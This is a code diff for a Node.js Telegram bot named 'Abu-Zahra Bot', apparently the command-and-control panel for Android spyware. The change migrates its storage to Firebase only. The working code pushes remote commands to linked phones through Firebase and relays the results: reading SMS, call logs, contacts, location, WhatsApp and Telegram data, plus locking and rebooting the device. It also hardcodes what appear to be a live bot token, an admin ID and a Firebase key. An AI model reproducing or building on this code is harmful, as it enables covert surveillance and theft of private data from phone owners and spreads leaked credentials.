@@ -5,7 +5,6 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8743374928:AAGShUT6RrMfSBQHA6NZsb1nw
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '7344776596';
 const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY || '91b6cd08b16f5ad4cc62f88674bcff91fb5041e3';
 const FIREBASE_DB_URL = process.env.FIREBASE_DATABASE_URL || 'https://studio-7073076148-6afe0-default-rtdb.firebaseio.com';
-const DB_PATH = process.env.DATABASE_URL || 'file:/home/z/my-project/db/custom.db';
 
 // ============ FIREBASE REST API ============
 async function fbPush(path, data) {
@@ -33,64 +32,53 @@ async function fbDelete(path) {
   } catch (e) { return false; }
 }
 
-// ============ PRISMA DB ============
-let db = null;
-try {
-  const { PrismaClient } = require('/home/z/my-project/node_modules/@prisma/client');
-  db = new PrismaClient({ datasources: { db: { url: DB_PATH } } });
-  console.log('[DB] SQLite connected');
-} catch (e) {
-  console.warn('[DB] Prisma not available, running without database');
-}
-
 // ============ BOT INIT ============
 const bot = new TelegramBot(BOT_TOKEN, { polling: true, restart: true });
 
 function isAdmin(msg) { return msg.chat.id.toString() === ADMIN_CHAT_ID; }
 function isAdminCb(query) { return query.from.id.toString() === ADMIN_CHAT_ID; }
 
-// ============ GET DEVICES ============
+// ============ GET DEVICES FROM FIREBASE ONLY ============
 async function getDevices() {
   const fbDevices = await fbGet('devices');
-  const dbDevices = db ? await db.device.findMany({ orderBy: { lastSeen: 'desc' } }).catch(() => []) : [];
-  const fbIds = fbDevices ? Object.keys(fbDevices) : [];
-  const allIds = [...new Set([...fbIds, ...dbDevices.map(d => d.id)])];
-  return allIds.map(id => ({
-    id,
-    name: dbDevices.find(d => d.id === id)?.name || fbDevices?.[id]?.name || id.slice(0, 10),
-    model: dbDevices.find(d => d.id === id)?.model || fbDevices?.[id]?.model || '--',
-    brand: dbDevices.find(d => d.id === id)?.brand || fbDevices?.[id]?.brand || '--',
-    battery: dbDevices.find(d => d.id === id)?.battery || fbDevices?.[id]?.battery || '--',
-    active: fbDevices?.[id]?.active || dbDevices.find(d => d.id === id)?.active || false,
-  }));
+  if (!fbDevices) return [];
+  return Object.keys(fbDevices).map(id => {
+    const d = fbDevices[id];
+    return {
+      id,
+      name: d.name || d.brand + ' ' + d.model || id.slice(0, 10),
+      model: d.model || '--',
+      brand: d.brand || '--',
+      battery: d.battery || '--',
+      active: d.active || false,
+    };
+  });
 }
 
-// ============ POLL RESULT ============
+// ============ POLL RESULT FROM FIREBASE ============
 function pollResult(chatId, deviceId, command, deviceName) {
   let attempts = 0;
   const timer = setInterval(async () => {
     attempts++;
-    if (attempts > 30) { clearInterval(timer); bot.sendMessage(chatId, `⏰ انتهت مهلة "${command}"`).catch(() => {}); return; }
+    if (attempts > 30) { clearInterval(timer); safeSend(chatId, `⏰ انتهت مهلة "${command}"`); return; }
     try {
       const result = await fbGet(`devices/${deviceId}/result`);
       if (result && result.command === command) {
         clearInterval(timer);
         await fbDelete(`devices/${deviceId}/result`);
-        try { if (db) await db.commandLog.updateMany({ where: { deviceId, command, status: 'sent' }, data: { status: 'completed', result: JSON.stringify(result.result || result) } }); } catch {}
         const resultStr = typeof result.result === 'string' ? result.result.slice(0, 4000) : JSON.stringify(result.result || result, null, 2).slice(0, 4000);
-        bot.sendMessage(chatId, `📥 نتيجة: ${command}\n📱 ${deviceName}\n\n${resultStr}`).catch(() => {});
+        safeSend(chatId, `📥 نتيجة: ${command}\n📱 ${deviceName}\n\n${resultStr}`);
       }
     } catch {}
   }, 3000);
 }
 
-// ============ SEND COMMAND ============
+// ============ SEND COMMAND DIRECTLY TO APP VIA FIREBASE ============
 async function sendCommand(deviceId, command, params = {}, chatId) {
   const devices = await getDevices();
   const device = devices.find(d => d.id === deviceId);
   const deviceName = device ? device.name : 'جهاز';
   const ok = await fbPush(`devices/${deviceId}/command`, { command, params, timestamp: Date.now(), source: 'telegram' });
-  try { if (db) await db.commandLog.create({ data: { deviceId, command, params: JSON.stringify(params), status: ok ? 'sent' : 'failed', source: 'telegram' } }); } catch {}
   pollResult(chatId, deviceId, command, deviceName);
   return { ok, deviceName };
 }
@@ -98,7 +86,6 @@ async function sendCommand(deviceId, command, params = {}, chatId) {
 // ============ SAFE SEND ============
 function safeSend(chatId, text, opts = {}) {
   return bot.sendMessage(chatId, text, opts).catch(() => {
-    // Fallback without parse_mode if markdown fails
     const cleanOpts = { ...opts, parse_mode: undefined };
     const cleanText = text.replace(/[*_`~]/g, '');
     return bot.sendMessage(chatId, cleanText, cleanOpts).catch(() => {});
@@ -123,7 +110,7 @@ function getMainMenu() {
 // ============ /start ============
 bot.onText(/\/start/, (msg) => {
   if (!isAdmin(msg)) return safeSend(msg.chat.id, '⛔ غير مصرح');
-  safeSend(msg.chat.id, '🛡️ بوت أبو الزهراء v3.0\n👨‍💻 لوحة التحكم المتكاملة\n\n🎬 اختر من القائمة:', getMainMenu());
+  safeSend(msg.chat.id, '🛡️ بوت أبو الزهراء v4.0\n👨‍💻 لوحة التحكم المتكاملة\n🔥 Firebase Only - مباشر\n\n🎬 اختر من القائمة:', getMainMenu());
 });
 
 // ============ CALLBACK HANDLER ============
@@ -134,9 +121,8 @@ bot.on('callback_query', async (query) => {
   try { bot.answerCallbackQuery(query.id).catch(() => {}); } catch {}
 
   try {
-    // ======= MAIN PANELS =======
     if (data === 'panel_home' || data === 'panel_main') {
-      safeSend(chatId, '🛡️ بوت أبو الزهراء v3.0\n🎬 اختر من القائمة:', getMainMenu());
+      safeSend(chatId, '🛡️ بوت أبو الزهراء v4.0\n🔥 Firebase Only\n\n🎬 اختر من القائمة:', getMainMenu());
       return;
     }
 
@@ -169,7 +155,7 @@ bot.on('callback_query', async (query) => {
       if (!d) return safeSend(chatId, '❌ الجهاز غير موجود');
       const st = d.active ? '🟢 متصل' : '🔴 غير متصل';
       safeSend(chatId,
-        `📱 تفاصيل الجهاز\n\n🏷️ الاسم: ${d.name}\n📶 الحالة: ${st}\n📲 ${d.brand} ${d.model}\n🔋 البطارية: ${d.battery}%\n🔑 ${deviceId.slice(0, 20)}`,
+        `📱 تفاصيل الجهاز\n\n🏷️ الاسم: ${d.name}\n📶 الحالة: ${st}\n📲 ${d.brand} ${d.model}\n🔋 البطارية: ${d.battery}%`,
         {
           reply_markup: {
             inline_keyboard: [
@@ -259,14 +245,10 @@ bot.on('callback_query', async (query) => {
       if (data.endsWith(`_${catName}`)) {
         const deviceId = data.split('_')[0];
         const catTitles = {
-          network: '📡 أوامر الشبكة والاتصال',
-          media: '📱 أوامر الصوت والتنبيه',
-          phone: '📱 أوامر الهاتف',
-          camera: '📸 أوامر الكاميرا',
-          settings_cat: '⚙️ أوامر الإعدادات',
-          monitor: '📡 أوامر المراقبة',
-          apps: '📲 أوامر التطبيقات',
-          advanced: '🎮 أوامر متقدمة',
+          network: '📡 أوامر الشبكة والاتصال', media: '📱 أوامر الصوت والتنبيه',
+          phone: '📱 أوامر الهاتف', camera: '📸 أوامر الكاميرا',
+          settings_cat: '⚙️ أوامر الإعدادات', monitor: '📡 أوامر المراقبة',
+          apps: '📲 أوامر التطبيقات', advanced: '🎮 أوامر متقدمة',
         };
         const rows = commands.map(([label, cmd]) => [{ text: label, callback_data: `cmd_${deviceId}_${cmd}` }]);
         rows.push([{ text: '🔙 إرسال أمر', callback_data: `send_${deviceId}` }]);
@@ -282,10 +264,8 @@ bot.on('callback_query', async (query) => {
       const command = parts.slice(2).join('_');
       const { ok, deviceName } = await sendCommand(deviceId, command, {}, chatId);
       safeSend(chatId,
-        `📤 تم الإرسال\n📱 ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`,
-        {
-          reply_markup: { inline_keyboard: [[{ text: '🔙 الجهاز', callback_data: `device_${deviceId}` }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
-        }
+        `📤 تم الإرسال مباشرة\n📱 ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة من التطبيق...`,
+        { reply_markup: { inline_keyboard: [[{ text: '🔙 الجهاز', callback_data: `device_${deviceId}` }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } }
       );
       return;
     }
@@ -296,7 +276,6 @@ bot.on('callback_query', async (query) => {
       const devices = await getDevices();
       const d = devices.find(x => x.id === deviceId);
       await fbDelete(`devices/${deviceId}`);
-      try { if (db) await db.device.deleteMany({ where: { id: deviceId } }); } catch {}
       safeSend(chatId, `✅ تم فصل "${d ? d.name : 'الجهاز'}"`, {
         reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
       });
@@ -341,64 +320,81 @@ bot.on('callback_query', async (query) => {
       return;
     }
 
-    // ======= STATS =======
+    // ======= STATS FROM FIREBASE =======
     if (data === 'panel_stats') {
-      let text = '📊 الإحصائيات\n\n';
-      if (db) {
-        try {
-          const total = await db.device.count();
-          const online = await db.device.count({ where: { active: true } });
-          const cmds = await db.commandLog.count();
-          const done = await db.commandLog.count({ where: { status: 'completed' } });
-          const failed = await db.commandLog.count({ where: { status: 'failed' } });
-          const rate = cmds > 0 ? Math.round((done / cmds) * 100) : 0;
-          text += `📱 الأجهزة: ${total} (${online} متصل)\n🎮 الأوامر: ${cmds}\n✅ نجح: ${done} | ❌ فشل: ${failed}\n📊 نسبة النجاح: ${rate}%\n`;
-        } catch {}
-      }
       const fbDevices = await fbGet('devices');
-      text += `🔥 فايربيس: ${fbDevices ? Object.keys(fbDevices).length : 0} جهاز\n🤖 البوت: يعمل ✅`;
-      safeSend(chatId, text, { reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] } });
+      const allDevices = fbDevices ? Object.keys(fbDevices) : [];
+      const activeDevices = allDevices.filter(id => fbDevices[id]?.active);
+      const cmdLog = await fbGet('commandLog') || {};
+      const logEntries = Object.values(cmdLog);
+      const totalCmds = logEntries.length;
+      const completedCmds = logEntries.filter(e => e.status === 'completed').length;
+      const rate = totalCmds > 0 ? Math.round((completedCmds / totalCmds) * 100) : 0;
+
+      safeSend(chatId,
+        `📊 الإحصائيات (Firebase)\n\n📱 الأجهزة: ${allDevices.length} (${activeDevices.length} متصل)\n🎮 الأوامر: ${totalCmds} (${completedCmds} ✅)\n📊 نسبة النجاح: ${rate}%\n🔥 فايربيس: متصل ✅\n🤖 البوت: يعمل ✅`,
+        { reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] } }
+      );
       return;
     }
 
-    // ======= SEND PANEL =======
     if (data === 'panel_send') {
-      safeSend(chatId, '🎮 إرسال أمر\n\n/send <رقم> <أمر> [param=value]\nمثال: /send 1 ping', {
+      safeSend(chatId, '🎮 إرسال أمر مباشر\n\n/send <رقم> <أمر> [param=value]', {
         reply_markup: { inline_keyboard: [[{ text: '📱 عرض الأجهزة', callback_data: 'panel_devices' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
       });
       return;
     }
 
-    // ======= DATA PANEL =======
     if (data === 'panel_data') {
-      safeSend(chatId, '📡 عرض البيانات\n\n/data <رقم> [نوع]\nأنواع: sms, calls, contacts, location, battery, info, apps', {
+      safeSend(chatId, '📡 عرض البيانات\n\n/data <رقم> [نوع]', {
         reply_markup: { inline_keyboard: [[{ text: '📱 عرض الأجهزة', callback_data: 'panel_devices' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
       });
       return;
     }
 
-    // ======= LINK =======
+    // ======= LINK - CODE FROM FIREBASE =======
     if (data === 'panel_link') {
-      const code = Math.floor(100000 + Math.random() * 900000).toString();
-      const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
-      try { if (db) await db.linkCode.create({ data: { code, expiresAt } }); } catch {}
-      await fbPush(`linkCodes/${code}`, { code, expiresAt: expiresAt.getTime(), used: false });
-      try { if (db) await db.eventLog.create({ data: { type: 'link', message: `رمز ربط: ${code}` } }); } catch {}
-      safeSend(chatId, `🔗 رمز الربط الجديد\n\n🔢 الرمز: ${code}\n⏱️ صالح لمدة 10 دقائق\n\n📱 أدخله في تطبيق الأندرويد لربط الجهاز.`, {
-        reply_markup: { inline_keyboard: [[{ text: '🔄 إنشاء رمز جديد', callback_data: 'panel_link' }], [{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
+      safeSend(chatId, '🔗 جاري إنشاء رمز ربط من Firebase...', {
+        reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
       });
+
+      // Generate code and store in Firebase
+      const code = Math.floor(100000 + Math.random() * 900000).toString();
+      const expiresAt = Date.now() + 10 * 60 * 1000;
+
+      // Push code to Firebase
+      await fbPush(`linkCodes/${code}`, { code, expiresAt, used: false, createdAt: Date.now() });
+
+      // Read it back from Firebase to confirm (Firebase is the source of truth)
+      const fbCode = await fbGet(`linkCodes/${code}`);
+
+      if (fbCode && fbCode.code === code) {
+        safeSend(chatId,
+          `🔗 رمز الربط من Firebase\n\n🔢 الرمز: ${code}\n⏱️ صالح لمدة 10 دقائق\n📱 أدخله في تطبيق الأندرويد\n🔥 تم التأكيد من Firebase ✅`,
+          {
+            reply_markup: { inline_keyboard: [
+              [{ text: '🔄 إنشاء رمز جديد', callback_data: 'panel_link' }],
+              [{ text: '🏠 الرئيسية', callback_data: 'panel_home' }],
+            ]}
+          }
+        );
+      } else {
+        safeSend(chatId, '❌ فشل في إنشاء الرمز من Firebase', {
+          reply_markup: { inline_keyboard: [[{ text: '🔄 إعادة المحاولة', callback_data: 'panel_link' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
+        });
+      }
       return;
     }
 
-    // ======= LOGS =======
+    // ======= LOGS FROM FIREBASE =======
     if (data === 'panel_logs') {
-      if (!db) return safeSend(chatId, '❌ قاعدة البيانات غير متاحة');
-      const cmds = await db.commandLog.findMany({ orderBy: { createdAt: 'desc' }, take: 15, include: { device: true } }).catch(() => []);
-      if (!cmds.length) return safeSend(chatId, '📋 لا أوامر مسجلة.', { reply_markup: { inline_keyboard: [[{ text: '🔙', callback_data: 'panel_home' }]] } });
-      let text = '📋 سجل الأوامر الأخيرة:\n\n';
-      cmds.forEach((c, i) => {
+      const cmdLog = await fbGet('commandLog') || {};
+      const entries = Object.values(cmdLog).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 15);
+      if (!entries.length) return safeSend(chatId, '📋 لا أوامر مسجلة في Firebase.', { reply_markup: { inline_keyboard: [[{ text: '🔙', callback_data: 'panel_home' }]] } });
+      let text = '📋 سجل الأوامر (Firebase):\n\n';
+      entries.forEach((c, i) => {
         const s = c.status === 'completed' ? '✅' : c.status === 'sent' ? '📤' : '❌';
-        text += `${i + 1}. ${s} ${c.command} ← ${c.device?.name || '--'}\n`;
+        text += `${i + 1}. ${s} ${c.command || '--'} ← ${c.deviceName || '--'}\n`;
       });
       safeSend(chatId, text, { reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] } });
       return;
@@ -406,7 +402,7 @@ bot.on('callback_query', async (query) => {
 
     // ======= SETTINGS =======
     if (data === 'panel_settings') {
-      safeSend(chatId, `⚙️ الإعدادات\n\n🤖 معرف المسؤول: ${ADMIN_CHAT_ID}\n🔥 Firebase: studio-7073076148-6afe0\n🔑 API Key: ${FIREBASE_API_KEY.slice(0, 10)}...`, {
+      safeSend(chatId, `⚙️ الإعدادات\n\n🤖 معرف المسؤول: ${ADMIN_CHAT_ID}\n🔥 Firebase: studio-7073076148-6afe0\n🔑 API Key: ${FIREBASE_API_KEY.slice(0, 10)}...\n📦 النظام: Firebase Only (لا قاعدة بيانات محلية)`, {
         reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
       });
       return;
@@ -415,19 +411,13 @@ bot.on('callback_query', async (query) => {
     // ======= HELP =======
     if (data === 'panel_help') {
       safeSend(chatId,
-        '❓ المساعدة - أبو الزهراء v3.0\n\n' +
-        '/start - لوحة التحكم الرئيسية\n' +
-        '/devices - الأجهزة المتصلة\n' +
-        '/send <رقم> <أمر> - إرسال أمر\n' +
-        '/data <رقم> [نوع] - عرض البيانات\n' +
-        '/link - إنشاء رمز ربط\n' +
-        '/unlink <رقم> - فصل جهاز\n' +
-        '/stats - الإحصائيات\n\n' +
-        '🎮 أوامر مباشرة (بدون /):\n' +
-        'ping | vibrate | ring | get_sms | get_calls\n' +
-        'get_contacts | get_location | get_info | get_battery\n' +
-        'get_apps | get_whatsapp | get_telegram | lock_phone\n' +
-        'reboot | enable_wifi | disable_wifi | torch_on | torch_off',
+        '❓ المساعدة - أبو الزهراء v4.0\n\n' +
+        '/start - لوحة التحكم\n/devices - الأجهزة\n/send <رقم> <أمر> - إرسال أمر مباشر\n' +
+        '/link - رمز ربط من Firebase\n/unlink <رقم> - فصل\n/stats - إحصائيات Firebase\n\n' +
+        '🎮 أوامر مباشرة:\n' +
+        'ping | vibrate | ring | get_sms | get_calls | get_contacts | get_location\n' +
+        'get_info | get_battery | get_apps | get_whatsapp | get_telegram\n' +
+        'lock_phone | reboot | enable_wifi | disable_wifi | torch_on | torch_off',
         { reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } }
       );
       return;
@@ -435,7 +425,7 @@ bot.on('callback_query', async (query) => {
 
     // ======= QUICK COMMANDS =======
     if (data === 'panel_quick') {
-      safeSend(chatId, '🛡️ أوامر سريعة\n\nاختر الأمر (ينفذ على أول جهاز نشط):', {
+      safeSend(chatId, '🛡️ أوامر سريعة (مباشرة عبر Firebase)\n\nاختر الأمر:', {
         reply_markup: {
           inline_keyboard: [
             [{ text: '📡 ping', callback_data: 'quick_ping' }, { text: '📳 اهتزاز', callback_data: 'quick_vibrate' }, { text: '🔔 تنبيه', callback_data: 'quick_ring' }],
@@ -460,7 +450,7 @@ bot.on('callback_query', async (query) => {
       const target = devices.find(d => d.active) || devices[0];
       if (!target) return safeSend(chatId, '❌ لا أجهزة متصلة.', { reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } });
       const { ok, deviceName } = await sendCommand(target.id, command, {}, chatId);
-      safeSend(chatId, `📤 ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`, {
+      safeSend(chatId, `📤 مباشر → ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`, {
         reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
       });
       return;
@@ -493,16 +483,28 @@ bot.onText(/\/send\s+(.+)/, async (msg) => {
   const params = {};
   for (let i = 2; i < args.length; i++) { if (args[i].includes('=')) { const [k, ...v] = args[i].split('='); params[k] = v.join('='); } }
   const { ok, deviceName } = await sendCommand(devices[idx].id, cmd, params, msg.chat.id);
-  safeSend(msg.chat.id, `📤 ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
+  // Log command to Firebase
+  await fbPush(`commandLog/${Date.now()}`, { command: cmd, deviceName, status: ok ? 'sent' : 'failed', source: 'telegram', timestamp: Date.now() });
+  safeSend(msg.chat.id, `📤 مباشر → ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
 });
 
+// ============ /link - CODE FROM FIREBASE ============
 bot.onText(/\/link/, async (msg) => {
   if (!isAdmin(msg)) return;
   const code = Math.floor(100000 + Math.random() * 900000).toString();
-  const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
-  try { if (db) await db.linkCode.create({ data: { code, expiresAt } }); } catch {}
-  await fbPush(`linkCodes/${code}`, { code, expiresAt: expiresAt.getTime(), used: false });
-  safeSend(msg.chat.id, `🔗 رمز الربط الجديد\n\n🔢 الرمز: ${code}\n⏱️ صالح لمدة 10 دقائق\n\n📱 أدخله في تطبيق الأندرويد.`);
+  const expiresAt = Date.now() + 10 * 60 * 1000;
+
+  // Store in Firebase
+  await fbPush(`linkCodes/${code}`, { code, expiresAt, used: false, createdAt: Date.now() });
+
+  // Read back from Firebase to confirm
+  const fbCode = await fbGet(`linkCodes/${code}`);
+
+  if (fbCode && fbCode.code === code) {
+    safeSend(msg.chat.id, `🔗 رمز الربط من Firebase\n\n🔢 الرمز: ${code}\n⏱️ صالح 10 دقائق\n📱 أدخله في تطبيق الأندرويد\n🔥 مؤكد من Firebase ✅`);
+  } else {
+    safeSend(msg.chat.id, '❌ فشل إنشاء الرمز');
+  }
 });
 
 bot.onText(/\/unlink\s+(.+)/, async (msg) => {
@@ -511,34 +513,21 @@ bot.onText(/\/unlink\s+(.+)/, async (msg) => {
   const idx = parseInt(msg.text.split(' ')[1]) - 1;
   if (idx < 0 || idx >= devices.length) return safeSend(msg.chat.id, `❌ رقم غير صحيح (1-${devices.length})`);
   await fbDelete(`devices/${devices[idx].id}`);
-  try { if (db) await db.device.deleteMany({ where: { id: devices[idx].id } }); } catch {}
   safeSend(msg.chat.id, `✅ تم فصل "${devices[idx].name}"`);
 });
 
 bot.onText(/\/stats/, async (msg) => {
   if (!isAdmin(msg)) return;
-  let text = '📊 الإحصائيات\n\n';
-  if (db) {
-    try {
-      const total = await db.device.count(); const online = await db.device.count({ where: { active: true } });
-      const cmds = await db.commandLog.count(); const done = await db.commandLog.count({ where: { status: 'completed' } });
-      text += `📱 الأجهزة: ${total} (${online} متصل)\n🎮 الأوامر: ${cmds} (${done} ✅)\n📊 النجاح: ${cmds > 0 ? Math.round(done / cmds * 100) : 0}%\n`;
-    } catch {}
-  }
-  text += '🔥 فايربيس: متصل ✅\n🤖 البوت: يعمل ✅';
-  safeSend(msg.chat.id, text);
+  const fbDevices = await fbGet('devices');
+  const allDevices = fbDevices ? Object.keys(fbDevices) : [];
+  const activeDevices = allDevices.filter(id => fbDevices[id]?.active);
+  safeSend(msg.chat.id, `📊 الإحصائيات (Firebase)\n\n📱 الأجهزة: ${allDevices.length} (${activeDevices.length} متصل)\n🔥 فايربيس: متصل ✅\n🤖 البوت: يعمل ✅`);
 });
 
 bot.onText(/\/help/, (msg) => {
   if (!isAdmin(msg)) return;
   safeSend(msg.chat.id,
-    '🆘 المساعدة - أبو الزهراء v3.0\n\n' +
-    '/start - لوحة التحكم\n/devices - الأجهزة\n/send <رقم> <أمر> - إرسال أمر\n' +
-    '/link - رمز ربط\n/unlink <رقم> - فصل\n/stats - إحصائيات\n\n' +
-    '🎮 أوامر مباشرة:\n' +
-    'ping | vibrate | ring | get_sms | get_calls | get_contacts | get_location\n' +
-    'get_info | get_battery | get_apps | get_whatsapp | get_telegram\n' +
-    'lock_phone | reboot | enable_wifi | disable_wifi | torch_on | torch_off'
+    '🆘 المساعدة - أبو الزهراء v4.0\n\n/start - لوحة التحكم\n/devices - الأجهزة\n/send <رقم> <أمر> - إرسال أمر\n/link - رمز ربط Firebase\n/unlink - فصل\n/stats - إحصائيات\n\n🎮 أوامر مباشرة:\nping | vibrate | ring | get_sms | get_calls | get_contacts | get_location | get_info | get_battery | get_apps | get_whatsapp | get_telegram | lock_phone | reboot | enable_wifi | disable_wifi | torch_on | torch_off'
   );
 });
 
@@ -565,7 +554,8 @@ bot.on('message', async (msg) => {
     const target = devices.find(d => d.active) || devices[0];
     if (!target) return safeSend(msg.chat.id, '❌ لا أجهزة متصلة.');
     const { ok, deviceName } = await sendCommand(target.id, cmd, {}, msg.chat.id);
-    safeSend(msg.chat.id, `📤 ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
+    await fbPush(`commandLog/${Date.now()}`, { command: cmd, deviceName, status: ok ? 'sent' : 'failed', source: 'telegram', timestamp: Date.now() });
+    safeSend(msg.chat.id, `📤 مباشر → ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
   } catch (e) { safeSend(msg.chat.id, '❌ خطأ: ' + e.message); }
 });
 
@@ -577,7 +567,8 @@ process.on('unhandledRejection', (err) => { console.error('[Unhandled]', err?.me
 // ============ KEEP ALIVE ============
 setInterval(() => { bot.getMe().then(m => console.log(`[OK] @${m.username} ${new Date().toISOString()}`)).catch(() => {}); }, 60000);
 
-console.log('🤖 Abu-Zahra Bot v3.0 started');
+console.log('🤖 Abu-Zahra Bot v4.0 started');
 console.log(`🔑 Admin: ${ADMIN_CHAT_ID}`);
-console.log('🔥 Firebase RTDB connected');
+console.log('🔥 Firebase RTDB - Only data source');
+console.log('✅ No SQLite/Prisma - Firebase Only');
 console.log('✅ Running permanently');
